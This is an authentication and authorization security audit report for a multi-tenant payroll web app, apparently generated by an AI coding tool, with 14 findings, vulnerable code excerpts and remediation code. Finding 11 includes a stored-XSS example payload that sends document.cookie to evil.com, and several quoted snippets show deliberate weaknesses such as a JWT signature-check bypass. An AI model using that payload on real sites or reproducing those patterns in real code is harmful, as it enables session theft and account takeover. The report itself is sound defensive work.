# Bantu-Cloud — Security Audit Report
**Authentication & Authorization Review**
**Date:** 2026-05-16 · **Analyst:** Claude Code · **Scope:** Full-stack auth/authz

---

## Executive Summary

The platform has a solid security foundation: bcrypt password hashing, Helmet headers, CORS restrictions, a well-structured 3-level multi-tenant hierarchy, and a database-backed session model. However, **3 CRITICAL and 3 HIGH severity issues** need to be addressed before this system handles production payroll data. The most urgent concern is a JWT verification bypass that can be triggered by a single environment variable, and the complete absence of a token refresh endpoint despite the frontend already calling it.

---

## Severity Legend

| Level | Meaning |
|-------|---------|
| 🔴 CRITICAL | Authentication bypass or complete data compromise possible |
| 🟠 HIGH | Significant security degradation; fix before go-live |
| 🟡 MEDIUM | Real risk with specific preconditions |
| 🟢 LOW | Hardening improvement; low exploitability |

---

## Finding Summary

| # | Title | File | Severity |
|---|-------|------|----------|
| 1 | JWT signature verification bypass | `backend/lib/auth.js:6-48` | 🔴 CRITICAL |
| 2 | `/auth/refresh` endpoint missing | `backend/routes/auth.js` | 🔴 CRITICAL |
| 3 | Token not revoked after password reset | `backend/routes/auth.js` | 🔴 CRITICAL |
| 4 | Refresh token stored in `localStorage` (XSS) | `frontend/src/lib/auth.ts:61` | 🟠 HIGH |
| 5 | Hardcoded `desktop-dummy-secret` fallback | `backend/lib/auth.js:7` | 🟠 HIGH |
| 6 | Login lockout lives in process memory | `backend/routes/auth.js:66` | 🟠 HIGH |
| 7 | `COMPANY_USER` not verified against assigned company | `backend/middleware/companyContext.js` | 🟡 MEDIUM |
| 8 | GCP credentials written to `/tmp` (world-readable) | `backend/index.js:1-3` | 🟡 MEDIUM |
| 9 | Cron secret comparison not timing-safe | `backend/routes/cron.js` | 🟡 MEDIUM |
| 10 | No CSRF protection on state-changing routes | `backend/index.js` | 🟡 MEDIUM |
| 11 | No input sanitization (stored XSS risk) | `backend/routes/*.js` | 🟡 MEDIUM |
| 12 | No backend logout / session revocation | `backend/routes/auth.js` | 🟢 LOW |
| 13 | Password reset token hashed with plain SHA-256 | `backend/routes/auth.js:149` | 🟢 LOW |
| 14 | No compliance-ready data handling | Platform-wide | 🟢 LOW |

---

## Detailed Findings

---

### 🔴 CRITICAL — Finding 1: JWT Signature Verification Bypass

**File:** `backend/lib/auth.js` lines 6–48

```js
const SKIP_VERIFY = process.env.AUTH_SKIP_VERIFY === 'true';
const SECRET = SKIP_VERIFY ? 'desktop-dummy-secret' : process.env.JWT_SECRET;

const verifyToken = (token) => {
  if (SKIP_VERIFY) {
    const decoded = jwt.decode(token);   // ← NO SIGNATURE CHECK
    if (!decoded) throw new Error('Malformed token');
    return decoded;
  }
  return jwt.verify(token, SECRET);
};
```

**What can go wrong:** Setting `AUTH_SKIP_VERIFY=true` in any environment (even accidentally in a staging `.env`) disables all JWT verification. Any actor who can forge a token payload — with `role: "PLATFORM_ADMIN"` — gains unrestricted access to every tenant's payroll data.

**Fix:**

```js
// backend/lib/auth.js — remove SKIP_VERIFY entirely
const SECRET = process.env.JWT_SECRET;
if (!SECRET) throw new Error('JWT_SECRET env variable is required');

const verifyToken = (token) => {
  // Always verify the signature. No exceptions.
  return jwt.verify(token, SECRET, { algorithms: ['HS256'] });
};
```

If desktop offline mode genuinely needs this, use a separate signed session store (e.g., a local SQLite row containing an HMAC) rather than bypassing JWT entirely.

---

### 🔴 CRITICAL — Finding 2: `/auth/refresh` Endpoint Does Not Exist

**File:** `frontend/src/api/http.ts` line 59 calls it; `backend/routes/auth.js` never defines it

```ts
// frontend/src/api/http.ts:59 — calls an endpoint that returns 404
const refreshRes = await fetch(`${BASE_URL}/auth/refresh`, {
  method: 'POST',
  body: JSON.stringify({ userId, refreshToken }),
});
```

Because the endpoint is missing:
- Expired access tokens immediately log the user out
- Refresh tokens stored in `localStorage` are never validated
- Stolen refresh tokens can never be rotated or revoked

**Fix — add to `backend/routes/auth.js`:**

```js
router.post('/refresh', async (req, res) => {
  const { userId, refreshToken } = req.body;
  if (!userId || !refreshToken)
    return res.status(400).json({ message: 'userId and refreshToken required' });

  try {
    const user = await prisma.user.findUnique({ where: { id: userId } });

    if (
      !user?.refreshToken ||
      user.refreshToken !== refreshToken ||
      user.refreshTokenExpiry < new Date()
    ) {
      return res.status(401).json({ message: 'Invalid or expired refresh token' });
    }

    // Rotate refresh token
    const newRefreshToken = crypto.randomBytes(32).toString('hex');
    await prisma.user.update({
      where: { id: userId },
      data: {
        refreshToken: newRefreshToken,
        refreshTokenExpiry: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
      },
    });

    const newAccessToken = signToken({ userId: user.id, role: user.role /* … */ });
    res.json({ token: newAccessToken, refreshToken: newRefreshToken });
  } catch (err) {
    res.status(500).json({ message: 'Refresh failed' });
  }
});
```

**Required Prisma schema additions:**

```prisma
model User {
  // … existing fields
  refreshToken       String?
  refreshTokenExpiry DateTime?
}
```

---

### 🔴 CRITICAL — Finding 3: Stolen Refresh Token Survives a Password Reset

**File:** `backend/routes/auth.js` — password reset transaction

```js
await prisma.$transaction([
  prisma.user.update({ where: { id: user.id }, data: { password: hashedPassword } }),
  prisma.session.deleteMany({ where: { userId: user.id } }),  // ← sessions cleared
  // ← BUT refreshToken in User row is never nulled
]);
```

An attacker who has stolen a refresh token can call `/auth/refresh` after the victim resets their password and still obtain a valid access token.

**Fix — extend the reset transaction:**

```js
await prisma.$transaction([
  prisma.user.update({
    where: { id: user.id },
    data: {
      password: hashedPassword,
      refreshToken: null,          // ← revoke
      refreshTokenExpiry: null,    // ← revoke
    },
  }),
  prisma.session.deleteMany({ where: { userId: user.id } }),
]);
```

---

### 🟠 HIGH — Finding 4: Refresh Token Stored in `localStorage` (XSS Vulnerable)

**File:** `frontend/src/lib/auth.ts` line 61

```ts
export function getRefreshToken(): string | null {
  return IS_DESKTOP ? null : localStorage.getItem(REFRESH_TOKEN_KEY);
}
```

`localStorage` is readable by any JavaScript on the page. A single XSS vulnerability in any dependency — not even in Bantu's own code — exposes the refresh token.

**Preferred fix — move to `httpOnly` cookie:**

```js
// backend/routes/auth.js — on successful login
res
  .cookie('refreshToken', newRefreshToken, {
    httpOnly: true,                                      // not accessible to JS
    secure: process.env.NODE_ENV === 'production',       // HTTPS only
    sameSite: 'strict',                                  // CSRF protection
    maxAge: 7 * 24 * 60 * 60 * 1000,                    // 7 days
  })
  .json({ token: accessToken, role, clientId });
```

```ts
// frontend/src/api/http.ts — refresh uses cookie automatically
const refreshRes = await fetch(`${BASE_URL}/auth/refresh`, {
  method: 'POST',
  credentials: 'include',    // sends httpOnly cookie
});
// No need to read/store refreshToken in JS at all
```

Remove all `localStorage.setItem/getItem` calls for the refresh token key from the frontend.

---

### 🟠 HIGH — Finding 5: Hardcoded `desktop-dummy-secret`

**File:** `backend/lib/auth.js` line 7

```js
const SECRET = SKIP_VERIFY ? 'desktop-dummy-secret' : process.env.JWT_SECRET;
```

This secret is now public knowledge (anyone reading the repo or this document knows it). If `SKIP_VERIFY` is ever disabled in a future refactor but someone leaves `AUTH_SKIP_VERIFY=false` while also leaving `JWT_SECRET` unset, the server may fall back to nothing. Additionally the string is low-entropy compared to a random 256-bit secret.

**Fix:** Remove the fallback string. Enforce `JWT_SECRET` at startup:

```js
const SECRET = process.env.JWT_SECRET;
if (!SECRET || SECRET.length < 32) {
  throw new Error('JWT_SECRET must be set and at least 32 characters');
}
```

---

### 🟠 HIGH — Finding 6: Login Lockout Stored in Process Memory

**File:** `backend/routes/auth.js` line 66

```js
const loginFailures = new Map(); // email → { count, lockedUntil }
```

**Problems:**
1. Cleared on every server restart — attacker waits for a restart or triggers one
2. Per-process — multiple Node instances (load balancers, PM2 clusters) each have their own counter
3. Not audited — no security log of brute-force attempts

**Fix — move lockout to the database:**

```prisma
// schema.prisma
model User {
  loginAttempts Int       @default(0)
  lockedUntil   DateTime?
}
```

```js
// routes/auth.js — inside POST /login
const MAX_ATTEMPTS = 5;

const user = await prisma.user.findUnique({ where: { email } });

if (user?.lockedUntil && user.lockedUntil > new Date()) {
  const mins = Math.ceil((user.lockedUntil - Date.now()) / 60000);
  return res.status(429).json({ message: `Account locked for ${mins} more minute(s).` });
}

const valid = await bcrypt.compare(password, user.password);
if (!valid) {
  const attempts = (user.loginAttempts || 0) + 1;
  const lockout = attempts >= MAX_ATTEMPTS
    ? new Date(Date.now() + 15 * 60 * 1000 * Math.pow(2, attempts - MAX_ATTEMPTS))
    : null;
  await prisma.user.update({
    where: { id: user.id },
    data: { loginAttempts: attempts, lockedUntil: lockout },
  });
  return res.status(401).json({ message: 'Invalid credentials' });
}

// On success — clear counter
await prisma.user.update({
  where: { id: user.id },
  data: { loginAttempts: 0, lockedUntil: null },
});
```

---

### 🟡 MEDIUM — Finding 7: `COMPANY_USER` Not Verified Against Assigned Company

**File:** `backend/middleware/companyContext.js`

The middleware checks that `x-company-id` belongs to the user's client, but it does **not** verify the user has a `UserCompanyRole` row for that company. An employee hired by Company A (but in the same client) could craft a request with Company B's ID and pass the check.

**Fix:**

```js
if (role === 'COMPANY_USER') {
  const company = await prisma.company.findUnique({
    where: { id: companyId },
    select: { clientId: true },
  });
  if (!company || company.clientId !== req.user.clientId)
    return res.status(403).json({ message: 'Access denied' });

  // NEW — ensure the user is actually assigned to this company
  const assignment = await prisma.userCompanyRole.findFirst({
    where: { userId: req.user.userId, companyId },
  });
  if (!assignment)
    return res.status(403).json({ message: 'Not assigned to this company' });

  req.companyId = companyId;
  return next();
}
```

---

### 🟡 MEDIUM — Finding 8: GCP Credentials Written to World-Readable `/tmp`

**File:** `backend/index.js` lines 1–3

```js
if (process.env.GOOGLE_CREDENTIALS_JSON) {
  fs.writeFileSync('/tmp/gcp-credentials.json', process.env.GOOGLE_CREDENTIALS_JSON);
  process.env.GOOGLE_APPLICATION_CREDENTIALS = '/tmp/gcp-credentials.json';
}
```

`/tmp` is globally readable on most Linux systems. Any other process on the same machine or container can read the GCP service account key.

**Fix — pass credentials directly to GCP clients:**

```js
// Remove the file write entirely.
// In your GCP client instantiation:
const credentials = JSON.parse(process.env.GOOGLE_CREDENTIALS_JSON);
const storage = new Storage({ credentials });
const vision = new ImageAnnotatorClient({ credentials });
// etc.
```

If a file path is absolutely required, use a restricted temp path:

```js
const tmpPath = `/tmp/.gcp-${process.pid}`;
fs.writeFileSync(tmpPath, process.env.GOOGLE_CREDENTIALS_JSON, { mode: 0o600 }); // owner-only
process.on('exit', () => { try { fs.unlinkSync(tmpPath); } catch {} });
```

---

### 🟡 MEDIUM — Finding 9: Cron Secret Comparison Is Not Timing-Safe

**File:** `backend/routes/cron.js`

```js
if (!provided || provided !== secret) { … }
```

String equality in JavaScript is not constant-time. An attacker can perform a timing attack to infer the secret character by character.

**Fix:**

```js
const crypto = require('crypto');

if (!provided || provided.length !== secret.length) {
  return res.status(401).json({ message: 'Unauthorized' });
}
if (!crypto.timingSafeEqual(Buffer.from(provided), Buffer.from(secret))) {
  return res.status(401).json({ message: 'Unauthorized' });
}
```

Also enforce a minimum secret length at startup:

```js
if (!process.env.CRON_SECRET || process.env.CRON_SECRET.length < 32)
  throw new Error('CRON_SECRET must be at least 32 characters');
```

---

### 🟡 MEDIUM — Finding 10: No CSRF Protection on State-Changing Routes

**File:** `backend/index.js`

CORS is correctly restricted to known origins, but CORS alone does not prevent CSRF on routes that receive cookies or use predictable headers. If refresh tokens are moved to `httpOnly` cookies (as recommended in Finding 4), CSRF protection becomes mandatory.

**Fix — use `sameSite: 'strict'` on all cookies (no extra library needed if same-domain):**

The `sameSite: 'strict'` cookie attribute (set in Finding 4's fix) is sufficient if your frontend and API share the same registrable domain (e.g., `app.bantu.com` and `api.bantu.com` are same site). If they are cross-site, add a double-submit cookie or use the `csurf` package.

---

### 🟡 MEDIUM — Finding 11: No Input Sanitization (Stored XSS Risk)

**File:** `backend/routes/companies.js`, `employees.js`, and others

Prisma prevents SQL injection, but it does not prevent stored XSS. A company name of `<script>document.location='https://evil.com?c='+document.cookie</script>` will be stored and rendered.

**Fix — sanitize string inputs before storage:**

```js
const createDOMPurify = require('isomorphic-dompurify');

function sanitize(str) {
  return createDOMPurify.sanitize(str, { ALLOWED_TAGS: [] }); // strip all HTML
}

// Apply to every text field from external input
const company = await prisma.company.create({
  data: {
    name: sanitize(name),
    address: sanitize(address),
    // …
  },
});
```

Or sanitize on the React side with `DOMPurify` before rendering any user-supplied content that uses `dangerouslySetInnerHTML`.

---

### 🟢 LOW — Finding 12: No Backend Logout / Session Revocation

**File:** `frontend/src/lib/auth.ts` — logout is client-only

The frontend clears local state on logout but never calls the backend. An intercepted access token remains valid until natural expiry.

**Fix — add a logout route and call it:**

```js
// backend/routes/auth.js
router.post('/logout', authenticateToken, async (req, res) => {
  await prisma.session.deleteMany({ where: { userId: req.user.userId } });
  res
    .clearCookie('refreshToken', { httpOnly: true, sameSite: 'strict', secure: true })
    .json({ message: 'Logged out' });
});
```

```ts
// frontend/src/lib/auth.ts
export async function logout(): Promise<void> {
  try { await http.post('/auth/logout'); } catch { /* best effort */ }
  _token = null;
  sessionStorage.clear();
  localStorage.removeItem(REFRESH_TOKEN_KEY);
}
```

---

### 🟢 LOW — Finding 13: Password Reset Token Hashed with Plain SHA-256

**File:** `backend/routes/auth.js` line 149

```js
const hashedToken = crypto.createHash('sha256').update(rawToken).digest('hex');
```

SHA-256 is fast, which means an attacker who obtains the hash can brute-force short or guessable tokens quickly. Use HMAC-SHA-256 with the JWT secret to bind the hash to the server:

```js
const hashedToken = crypto
  .createHmac('sha256', process.env.JWT_SECRET)
  .update(rawToken)
  .digest('hex');
```

---

### 🟢 LOW — Finding 14: No Compliance-Ready Data Handling

This system processes sensitive payroll, tax, and employee data. Gaps exist for:

| Requirement | Status | Action |
|-------------|--------|--------|
| Data retention policy | ❌ Missing | Add scheduled purge for records older than legal minimum |
| Audit log tamper protection | ⚠️ Partial | Audit rows exist but can be deleted via Prisma; add append-only table or external sink |
| GDPR / POPIA right to erasure | ❌ Missing | Add `DELETE /api/employees/:id/data-export` and anonymisation endpoint |
| Encryption at rest | ❌ Not implemented | Use Neon's transparent encryption or encrypt PII fields before storage |
| Security event log | ⚠️ Partial | Failed logins and suspicious access not segregated from normal audit log |

---

## What the Codebase Gets Right

These are worth preserving as the system evolves:

| Practice | Location |
|---------|----------|
| ✅ `bcrypt(12)` password hashing | `routes/auth.js` |
| ✅ Helmet.js security headers | `index.js` |
| ✅ CORS restricted to known origins | `index.js` |
| ✅ Database-backed session model | `Session` table |
| ✅ Multi-tenant isolation in middleware | `companyContext.js` |
| ✅ RBAC with module + action granularity | `Role`, `RolePermission` tables |
| ✅ Invite tokens have 7-day expiry | `routes/invites.js` |
| ✅ Audit logging infrastructure | `utils/audit.js` |
| ✅ Rate limiting on `/api/auth` | `index.js` |
| ✅ TOTP / 2FA implementation present | `routes/auth.js` |
| ✅ Refresh token rotation logic (frontend) | `api/http.ts` |
| ✅ PII not logged | `utils/audit.js` |

---

## Recommended Implementation Order

### Phase 1 — Critical (this sprint)

1. **Remove `AUTH_SKIP_VERIFY`** — delete the env check and `desktop-dummy-secret` fallback
2. **Implement `/auth/refresh`** — with refresh token rotation and 7-day expiry
3. **Revoke refresh tokens on password reset** — one-line addition to the reset transaction

### Phase 2 — High (before go-live)

4. **Move refresh token to `httpOnly` cookie** — prevents XSS token theft
5. **Move login lockout to database** — add `loginAttempts` + `lockedUntil` to `User`
6. **Add backend `/auth/logout`** — revoke session + clear cookie

### Phase 3 — Medium (within 2 weeks)

7. **Verify `COMPANY_USER` against `UserCompanyRole`** — one query addition
8. **Fix GCP credentials handling** — pass object directly, not via `/tmp`
9. **Timing-safe cron secret comparison** — `crypto.timingSafeEqual`
10. **Input sanitization** — strip HTML from all text fields on write

### Phase 4 — Ongoing

11. CSRF double-submit if frontend/API are cross-site
12. HMAC-based password reset token hashing
13. Data retention policy and anonymisation endpoints
14. Segregated security event log

---

*Generated by security audit on 2026-05-16. Re-run after each Phase is completed.*
